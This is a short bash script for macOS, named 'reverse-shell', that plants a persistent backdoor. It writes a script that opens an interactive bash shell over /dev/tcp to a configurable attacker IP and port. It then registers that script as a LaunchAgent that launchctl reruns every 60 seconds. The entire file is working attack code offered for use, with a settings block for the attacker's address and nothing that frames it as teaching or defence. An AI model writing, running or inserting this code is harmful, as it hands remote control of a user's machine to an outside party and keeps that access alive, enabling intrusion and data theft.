#!/bin/bash

#### Change this stuff ####
scriptName=reverse-shell
attackerip=127.0.0.1
attackerport=9999
###########################


scriptFile=/tmp/$scriptName.sh
plistFile=~/Library/LaunchAgents/$scriptName.plist

# Create script file
printf '#!/bin/bash\n'"/bin/bash -i 1> /dev/tcp/$attackerip/$attackerport 2>&1 0>&1\nwait" > $scriptFile
chmod +x $scriptFile

# Create plist file
cat > $plistFile << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>$scriptName</string>
<key>Program</key>
<string>$scriptFile</string>
<key>StartInterval</key> 
<integer>60</integer>
</dict>
</plist>
EOF

# Add to launchctl
launchctl unload $plistFile
launchctl load $plistFile
